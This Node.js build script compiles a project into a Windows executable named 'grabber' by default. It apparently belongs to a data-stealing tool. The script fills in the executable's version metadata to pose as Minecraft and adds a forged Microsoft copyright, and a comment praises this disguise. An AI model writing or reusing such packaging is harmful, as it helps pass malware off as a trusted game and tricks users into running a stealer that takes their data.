const { compile } = require('nexe');

compile({
  input: './index.js',
  output: (require('./config').filename || 'grabber') + '.exe',
  build: true,
  resources: ['./functions/*.js', './util/*.js', './util/**/*.exe'],
  ico: './icon.ico',
  rc: { // This is one of the best things that exists
    CompanyName: 'Minecraft',
    ProductVersion: '1.19.60.03',
    FileVersion: '1.19.60.3',
    Copyright: '© Microsoft. All rights reserved.',
    OriginalFilename: 'Minecraft',
    FileDescription: 'Minecraft',
    ProductName: 'Minecraft'
  },
  verbose: true
}).then(() => {
  console.log('success');
});
